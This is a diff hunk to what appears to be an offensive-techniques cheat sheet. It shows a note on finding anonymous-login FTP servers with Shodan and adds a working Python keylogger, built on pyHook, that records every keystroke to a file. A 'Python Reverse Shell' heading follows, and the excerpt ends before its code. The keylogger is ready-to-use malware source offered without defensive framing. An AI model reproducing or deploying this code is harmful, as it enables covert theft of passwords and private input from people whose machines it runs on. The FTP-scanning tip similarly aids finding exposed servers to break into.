@@ -487,6 +487,22 @@ for item in r:
 2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
 3. Search Keyword : ```230 anonymous```
 
+# Python Keylogger:
+
+```python
+import pyHook, pythoncom, logging
+logging.basicConfig(filename='mykeylogger.txt', level=logging.DEBUG, format='%(message)s')
+
+def OnKeyboardEvent(event):
+    logging.log(logging.DEBUG,chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
+```
+
 # Python Reverse Shell:
 
 ```python
